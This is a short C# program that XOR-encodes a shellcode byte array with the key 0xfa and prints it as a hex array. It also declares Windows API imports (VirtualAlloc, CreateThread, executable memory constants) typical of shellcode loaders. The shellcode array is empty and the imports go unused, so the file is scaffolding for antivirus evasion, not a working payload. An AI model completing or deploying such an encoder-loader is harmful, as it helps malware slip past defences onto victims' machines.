using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;

namespace XOR
{
    class Program
    {
        // Import necessary WinAPI functions
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // Constants for memory allocation and protection
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;


        static string ConvertBytesToHexArray(byte[] bytes)
        {
            StringBuilder hex = new StringBuilder();
            hex.Append("{");
            for (int i = 0; i < bytes.Length; i++)
            {
                if (i % 12 == 0 && i != 0)
                    hex.Append("\n ");

                hex.AppendFormat("0x{0:X2}", bytes[i]);
                if (i < bytes.Length - 1)
                    hex.Append(",");
            }
            hex.Append("}");
            return hex.ToString();

        }

            static void Main(string[] args)
        {
         
            byte[] shellcode = new byte[460] {};
    
            // XORing
            byte[] encBytes = new byte[shellcode.Length];
            for (int i = 0; i < shellcode.Length; i++)
            {
                encBytes[i] = (byte)((uint)shellcode[i] ^0xfa);
            }

            Console.WriteLine(ConvertBytesToHexArray(encBytes));
          
        }
    }
}
